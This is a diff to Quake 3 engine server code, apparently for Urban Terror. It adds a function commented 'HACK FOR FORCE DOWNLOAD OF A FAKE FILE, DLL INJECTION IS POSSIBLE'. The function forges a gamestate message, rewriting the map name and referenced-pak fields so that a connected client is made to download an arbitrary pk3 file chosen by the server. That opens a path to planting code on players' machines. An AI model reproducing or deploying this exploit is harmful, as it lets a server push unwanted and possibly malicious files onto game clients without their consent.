@@ -866,7 +866,95 @@ void SV_SendClientGameState( client_t *client ) {
 	SV_SendMessageToClient( &msg, client );
 }
 
+/*
+================
+SV_ForcePk3DownloadByClientGameState
 
+HACK FOR FORCE DOWNLOAD OF A FAKE FILE, DLL INJECTION IS POSSIBLE
+================
+*/
+void SV_ForcePk3DownloadByClientGameState( client_t *client , char *todownload) {
+	int			start;
+	entityState_t	*base, nullstate;
+	msg_t		msg;
+	byte		msgBuffer[MAX_MSGLEN];
+	char        configmodified[MAX_CONFIGSTRINGS];
+	int checksum;
+	checksum = FS_GetCheckSumPakByName(todownload);
+	if(!checksum)
+	{
+		Com_Printf("Checksum not found, aborting...");
+		return;
+	}
+	client->state = CS_PRIMED;
+	client->pureAuthentic = 0;
+	client->gotCP = qfalse;
+
+	// when we receive the first packet from the client, we will
+	// notice that it is from a different serverid and that the
+	// gamestate message was not just sent, forcing a retransmit
+	client->gamestateMessageNum = client->netchan.outgoingSequence;
+
+	MSG_Init( &msg, msgBuffer, sizeof( msgBuffer ) );
+
+	// NOTE, MRE: all server->client messages now acknowledge
+	// let the client know which reliable clientCommands we have received
+	MSG_WriteLong( &msg, client->lastClientCommand );
+
+	// send any server commands waiting to be sent first.
+	// we have to do this cause we send the client->reliableSequence
+	// with a gamestate and it sets the clc.serverCommandSequence at
+	// the client side
+	SV_UpdateServerCommandsToClient( client, &msg );
+
+	// send the gamestate
+	MSG_WriteByte( &msg, svc_gamestate );
+	MSG_WriteLong( &msg, client->reliableSequence );
+
+	// For force this download, we need to change just the configstrings for add referenced
+	// files where they doesn't exist.
+	for ( start = 0 ; start < MAX_CONFIGSTRINGS ; start++ ) {
+		if (sv.configstrings[start][0]) {
+			MSG_WriteByte( &msg, svc_configstring );
+			MSG_WriteShort( &msg, start );
+			if(start==0)
+			{
+				strcpy(configmodified, sv.configstrings[start]);
+				Info_SetValueForKey(configmodified, "mapname", todownload);
+				MSG_WriteBigString( &msg, configmodified );
+			}else if(start==1)
+			{
+				strcpy(configmodified, sv.configstrings[start]);
+				Info_SetValueForKey(configmodified, "sv_referencedPaks", va("%i ", checksum));
+				//Get sum of md5
+				Info_SetValueForKey(configmodified, "sv_referencedPakNames", va("q3ut4/%s ", todownload));
+				MSG_WriteBigString( &msg, configmodified );
+			}else
+				MSG_WriteBigString( &msg, sv.configstrings[start] );
+		}
+	}
+
+	// write the baselines
+	Com_Memset( &nullstate, 0, sizeof( nullstate ) );
+	for ( start = 0 ; start < MAX_GENTITIES; start++ ) {
+		base = &sv.svEntities[start].baseline;
+		if ( !base->number ) {
+			continue;
+		}
+		MSG_WriteByte( &msg, svc_baseline );
+		MSG_WriteDeltaEntity( &msg, &nullstate, base, qtrue );
+	}
+
+	MSG_WriteByte( &msg, svc_EOF );
+
+	MSG_WriteLong( &msg, client - svs.clients);
+
+	// write the checksum feed
+	MSG_WriteLong( &msg, sv.checksumFeed);
+
+	// deliver this to the client
+	SV_SendMessageToClient( &msg, client );
+}
 /*
 ==================
 SV_ClientEnterWorld
